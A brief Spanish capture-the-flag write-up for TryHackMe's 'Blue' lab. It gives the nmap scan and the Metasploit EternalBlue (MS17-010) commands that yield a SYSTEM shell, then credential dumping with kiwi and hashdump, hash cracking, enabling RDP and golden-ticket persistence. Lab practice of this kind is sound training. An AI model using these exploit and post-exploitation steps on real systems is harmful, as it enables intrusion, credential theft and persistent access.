# Blue - TryHackMe
**IP:** 10.10.194.133

## Enumeración
```bash
nmap -sC -sV -p- --open --min-rate 5000 -Pn 10.10.194.133
```
Windows 7 con SMB (445) vulnerable a **MS17-010 (EternalBlue)**.

## Explotación - EternalBlue (MS17-010)
```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.194.133
set LHOST <mi_ip>
run
```
Devuelve una shell como `NT AUTHORITY\SYSTEM`.

## Post-explotación
```bash
getuid            # NT AUTHORITY\SYSTEM
load kiwi
creds_all         # credenciales en memoria
hashdump          # hashes NTLM
```
Los hashes se crackean con John/Hashcat. Extras útiles: `enable_rdp`, persistencia con `golden_ticket_create`.
